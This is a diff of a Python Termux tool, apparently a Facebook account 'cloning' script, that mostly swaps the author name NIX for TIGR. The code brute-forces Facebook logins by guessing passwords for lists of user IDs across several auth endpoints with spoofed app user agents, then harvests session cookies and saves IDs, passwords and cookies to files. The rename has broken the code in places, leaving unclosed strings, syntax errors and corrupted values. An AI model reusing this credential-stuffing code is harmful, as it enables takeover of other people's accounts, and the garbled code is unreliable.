@@ -1,7 +1,7 @@
-#-------------------------WRITTEN BY MR-NIX--------------
-#-------------------------- Code by MR-ERROR&NIX-----------
+#-------------------------WRITTEN BY MR-TIGR --------------
+#-------------------------- Code by MR-ERROR&TIGR-----------
 #-------------------Hello World -----------------------------
-#SC MAKED BY NIX
+#SC MAKED BY TIGR
 import os
 from os import system as clr
 from os import path
@@ -90,7 +90,13 @@ except: pass
 
 for xd in range(5000):
 	
-	aa = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IA/FB4A;FBAV/465.0.0.51.69;]""Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6392.72 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/466.0.0.55.68;]"] 
+	aa=["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/465.0.0.51.69;]",
+
+"Mozilla/5.0 (Linux; Android 14; SM-S711B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/462.0.0.47.76;]",
+
+"Mozilla/5.0 (Linux; Android 14; Xiaomi 23127PN0CG Build/UKQ1.231003.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/464.0.0.49.70;]",
+
+"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6392.72 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/466.0.0.55.68;]"
 	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
 	c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -174,14 +180,14 @@ BM = '\x1b[1;101m' # BELAJANG MERAH
 BA = '\x1b[1;100m' # BELAKANG ABU ABU
 import os
 os.system('git pull')
-os.system('mkdir NIX')
+os.system('mkdir 'TIGR)
 
 import os,zlib
 
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('         \x1b[38;5;46m WELCOME TO NIX WORLD          ')
+print('         \x1b[38;5;46m WELCOME TO TIGR WORLD          ')
 
 
 try:
@@ -227,7 +233,7 @@ except ModuleNotFoundError:
     #sexy()
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as SiamNIX
+from concurrent.futures import ThreadPoolExecutor as SiamTIGRTIGR
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -261,15 +267,15 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-os.system("xdg-open https://t.me/mrnixtermuxtool")
-sys.stdout.write('\x1b]2; Mr:NIX\x07')
+os.system("xdg-open https://t.me/mrtermuxtoolTIGR")
+sys.stdout.write('\x1b]2; Mr:TIGR\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-folder_path = '/sdcard/MR:NIX'
+folder_path = '/sdcard/MR:'TIGR
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -288,11 +294,11 @@ logo=(f"""
 \033[1;92m        .JML.    YM  .JMML..MM:.  .:MMa.
 __________________________________________________
 
- \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NiX\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
+ \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:TIGR\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
 ──────────────────────────────────────────────────
-\033[1;92m Owner   :            MR:NIX
-\033[1;92m Facebook:            Mr:Nix
-\033[1;92m Github  :            Mr-NIX
+\033[1;92m Owner   :            MR:TIGRTIGR
+\033[1;92m Facebook:            Mr:TIGR
+\033[1;92m Github  :            Mr-TIGR
 \033[1;92m Version :            0.0.4
 ──────────────────────────────────────────────────""")
 #__________________MAIN____________#
@@ -315,7 +321,7 @@ def result(OKs,cps):
         print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloneing Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
         print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
         print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
-        input("Press enter to back NIX Menu ")
+        input("Press enter to back TIGR Menu ")
         exit()
 os.system("xd-open https://github.com/Tox1c-143")
 def menu():   
@@ -337,11 +343,11 @@ def menu():
     else:
         print('\n Select Wrong option ... ')
         time.sleep(2)
-        NIX(allkey)
+        TIGR(allkey)
        # os.system('xdg-open https://wa.me/+8801310067277')
 #---------------------[ USER - AGENT ] -------------------#
 def uaxxx():
-    ua = ["FBAN/FB4A;FBAV/355.0.0.83.164;FBBV/15972112;FBDM={density=2.6,width=1286,height=2249};FBLC=en_US;FBRV=605424219;FBBK/FBAN;FBMF/HMD Global;FBBBD/samsung;FBDV/Samsung SM875;FBOS/6.5;FBDR/QP1A;FBCA/arm64-v8a;"]
+    ua='[FBAN/FB4A;FBAV/355.0.0.83.164;FBBV/15972112;FBDM/{density=6.2,width=1286,height=2249};FBLC/en_US;FBRV/60542419;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]
     return ua
 def method_crack():
     global methods
@@ -352,7 +358,7 @@ def method_crack():
     print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
     print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
     print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
-    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m]  /3[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
+    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
     print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
     print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     option = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSelect Method : ')
@@ -398,7 +404,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mbTIGRTIGR-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -414,8 +420,8 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             ######m1#####
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-        aa = ["Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36 [FB_IA/FB4A;FBAV/465.0.0.51.69;]","Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6302.72 Mobile Safari/537.36 [FB_IA/FB4A;FBAV/466.0.0.55.68;]"]
-          fs = name.split('')[0]
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/207.0.0.72.166;FBBV/74287579;FBDM/{density=3.7,width=1019,height=2540};FBLC/en_US;FBRV/93070009;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]
+            fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
             except:
@@ -474,17 +480,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);TIGR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={bTIGR};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTIGR-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)                 
-                    open('/sdcard/NIX/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/TIGR/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TIGR/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
+                     #print(f"\r\x1b[1;96m [TIGR-CP] {sid} ● {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/NIX/M1-CP.txt','a').write(sid+'●'+ps+'\n')
+                     open('/sdcard/TIGR/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -494,7 +500,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mTIGR-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -510,7 +516,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             #######m3####
-            uax = [f"FBAN/FBAA;FBBV/{random.randint(100,500)}.0.0.{random.randint(10,199)};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,999)};FBDV/samsung;FBMD/SM-{random.randint(100,999)}F;FBSN/Android;FBSV/{random.randint(5,13)};FBCA/arm64-v8a;",f"FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,999)};FBLC/en_US;FBDV/samsung;FBCA/arm64;", f"FBAN/FB4A;FBBV/{random.randint(200,400)}.0.0.{random.randint(10,999)};FBMD/Huawei;FBSV/{random.randint(6,14)};FBCA/arm64;"]
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/207.0.0.72.166;FBBV/74287579;FBDM/{density=3.7,width=1019,height=2540};FBLC/en_US;FBRV/93070009;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]
             ######
             fs = name.split(' ')[0]
             try:
@@ -567,17 +573,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);bTIGR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={bTIGR};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTIGR-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NIX/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/TIGR/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TIGR/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                   # print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
+                   # print(f"\r\x1b[1;96m [TIGR-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NIX/M3-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/TIGR/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -589,7 +595,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mTIGR-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -605,7 +611,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             ####m2######
-			uax = [f"FBAN/FB4A;FBAV/{random.randint(100,350)}.0.0.{random.randint(10,999)};FBBV/{random.randint(100,500)};FBDV/samsung;FBMD/SM-{random.randint(100,999)}F;FBSN/Android;FBSV/{random.randint(5,13)};FBCA/arm64-v8af"FBAN/FBIOS;FBAV/{random.randint(150,400)}.0.0.{random.randint(20,900)};FBLC/en_US;FBSV/{random.randint(12,16)};FBCA/arm64f"FBAN/FB4A;FBAV/{random.randint(200,300)}.0.0.{random.randint(33,888)};FBDV/Huawei;FBCA/arm64-v8a;"]
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/355.0.0.83.164;FBBV/15972112;FBDM/{density=6.2,width=1286,height=2249};FBLC/en_US;FBRV/60542419;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -631,7 +637,7 @@ class main_crack():
 "access_token": "",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "V2_UNTAGGED",
-'openid_tokens': "['.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
 "locale": "en_US",
@@ -661,17 +667,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);bTIGR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={bTIGR};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTIGR-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard//NIX/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard//TIGR/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TIGR/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
+                    #print(f"\r\x1b[1;96m [TIGR-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NIX/M2-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/TIGR/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -681,7 +687,7 @@ class main_crack():
     def methodD(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mTIGR-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -753,17 +759,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);bTIGR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={bTIGR};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTIGR-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/TIGR/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TIGR/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                   #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard//NIX/M4-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard//TIGR/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -792,7 +798,7 @@ class main_crack():
             current_time = now.strftime("%H:%M:%S")
             print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
             print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            with SiamNIX(max_workers=30) as NIXworld:
+            with SiamTIGR(max_workers=30) as worldTIGR:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -802,13 +808,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                NIXworld.submit(self.methodA, uid, name, pwx)
+                                worldTIGR.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                NIXworld.submit(self.methodB, uid, name, pwx)
+                                worldTIGR.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                NIXworld.submit(self.methodC, uid, name, pwx)
+                                worldTIGR.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                NIXworld.submit(self.methodD, uid, name, pwx)
+                                worldTIGR.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)
 
@@ -882,7 +888,7 @@ def rcrack(uid,pwx,tl):
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X678B"',
+    'sec-ch-ua-model': '"InfiTIGR X678B"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
@@ -900,23 +906,23 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[NIX-OK] '+cid+' | '+ps+'\033[0;97m')
+                print('\033[1;32m[TIGR-OK] '+cid+' | '+ps+'\033[0;97m')
                 print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                 linex()
-                open('NIX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                open('TIGR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[NIX-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('NIX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;31m[TIGR-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('TIGR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[1;92m[NIX]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[1;92m[TIGR]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
